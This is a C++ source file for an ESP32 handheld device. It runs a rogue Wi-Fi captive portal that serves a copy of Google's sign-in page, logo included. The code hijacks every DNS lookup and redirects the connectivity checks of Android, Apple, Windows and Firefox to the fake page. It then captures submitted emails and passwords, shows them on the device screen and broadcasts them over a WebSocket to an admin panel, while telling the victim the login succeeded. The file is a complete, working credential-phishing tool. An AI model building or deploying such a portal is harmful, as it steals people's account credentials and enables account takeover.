#include "portal.h"

AsyncWebServer server(http_port);
WebSocketsServer webSocket = WebSocketsServer(ws_port);
DNSServer dnsServer;

bool portalOpen = false;

char *creds[100]; // CURRENTLY SET AT 100, CAN BE CHANGED FOR NUMBER OF USERS YOU EXPECT TO BE STORING (WE WILL DEAL WITH THIS LATER)
char msg_buf[80];

String htmlPage = "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: 150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your Google Account</div></center><form action='/post' method='POST' id='login-form'><input name='email' class='input-field' type='text' placeholder='Email or phone' required><input name='password' class='input-field' type='password' placeholder='Enter your password' required /><div class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Next</button></div></form></div></div></div></body></html>";

void setupWifi(const char *ssid, const IPAddress &localIP, const IPAddress &gatewayIP) {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
  WiFi.softAP(ssid, NULL, wifi_channel, 0, max_clients);
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
}

void setupDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP); // Respond to all domains with the ESP32's IP
}

void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
	// Required
	server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });	// windows 11 captive portal workaround
	server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });								// Honestly don't understand what this is but a 404 stops win 10 keep calling this repeatedly and panicking the esp32 :)

  // Backup Responses
	server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });		   // android captive portal redirect
	server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // microsoft redirect
	server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });  // apple call home
	server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });	   // firefox captive portal call home
	server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });					   // firefox captive portal call home
	server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // windows call home

	// Return 404 to webpage icon
	server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });	// webpage icon

  // // Server Admin Page (With HTTP Auth)
  // server.on("/admin", HTTP_ANY, [](AsyncWebServerRequest *request) {
  //   if(!request->authenticate(auser, apass))
  //     return request->requestAuthentication();
  //   request->send(200, "text/html", "<h1>Admin Login successful!</h1>");
  // });

	// Serve Basic HTML Page
	server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
		AsyncWebServerResponse *response = request->beginResponse(200, "text/html", htmlPage);
		request->send(response);
	});

	// The Catch All
	server.onNotFound([](AsyncWebServerRequest *request) {
		request->redirect(localIPURL);
		Serial.print("Redirected to " + localIPURL + "\n");
	});

  server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request) {
    String email = request->getParam("email", true)->value();
    String password = request->getParam("password", true)->value();

    // IF ADMIN CREDS MATCH WITH THE INPUTTED CREDS
    if (email == auser && password == apass) {
      request->send(200, "text/html", ADMIN_PAGE);
    } else { // ELSE LOG THE CREDS TO THE LIST AND SEND THEM TO THE ADMIN PANEL VIA WEBSOCKET BROADCAST
      tft.setCursor(0, 10);
      tft.printf("%s : %s", email, password);

      request->send(200, "text/html", "<h1>Login successful!</h1>");

      sprintf(msg_buf, "%s:%s", email, password);
      Serial.printf("Sending Message Buffer: %s\n", msg_buf);
      webSocket.broadcastTXT(msg_buf);
    }
  });
}

void closePortal() {
  // server.close();
  webSocket.close();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  tft.clearDisplay();

  Serial.println("Server closed");
  portalOpen = false;
}

// Callback: receiving any WebSocket message
void onWebSocketEvent(uint8_t client_number,
                      WStype_t type,
                      uint8_t * payload,
                      size_t length) {

  // Figure out the type of WebSocket event
  switch(type) {

    // Client has disconnected
    case WStype_DISCONNECTED:
      Serial.printf("[%u] Disconnected!\n", client_number);
      break;

    // New client has connected
    case WStype_CONNECTED:
      {
        IPAddress ip = webSocket.remoteIP(client_number);
        Serial.printf("[%u] Connection from ", client_number);
        Serial.println(ip.toString());
      }
      break;

    // Handle text messages from client
    case WStype_TEXT:

      // Print out raw message
      Serial.printf("[%u] Received text: %s\n", client_number, payload);

      // Shutdown portal and device
      if ( strcmp((char *)payload, "shutdown") == 0 ) {
        closePortal();
        delay(1000);
        StickCP2.Power.powerOff();

      // Change SSID
      } else if ( strcmp((char *)payload, "changeSSID") == 0 ) {
        // sprintf(msg_buf, "%d", led_state);
        // Serial.printf("Sending to [%u]: %s\n", client_number, msg_buf);
        // webSocket.sendTXT(client_number, msg_buf);

      // Message not recognized
      } else {
        Serial.printf("[%u] Message not recognized\n", client_number);
      }
      break;

    // For everything else: do nothing
    case WStype_BIN:
    case WStype_ERROR:
    case WStype_FRAGMENT_TEXT_START:
    case WStype_FRAGMENT_BIN_START:
    case WStype_FRAGMENT:
    case WStype_FRAGMENT_FIN:
    default:
      break;
  }
}

void openPortal() {
  tft.clearDisplay();

  setupWifi(ssid, localIP, localIP);

  setupDNSServer(dnsServer, localIP);

  setupWebServer(server, localIP);
  server.begin();

  webSocket.begin();
  webSocket.onEvent(onWebSocketEvent);

  Serial.println("Server started");

  portalOpen = true;
}

void portalLoop() {
  dnsServer.processNextRequest(); // Handle DNS requests
  webSocket.loop();
  delay(30);
}

bool isPortalOpen() {
  return portalOpen;
}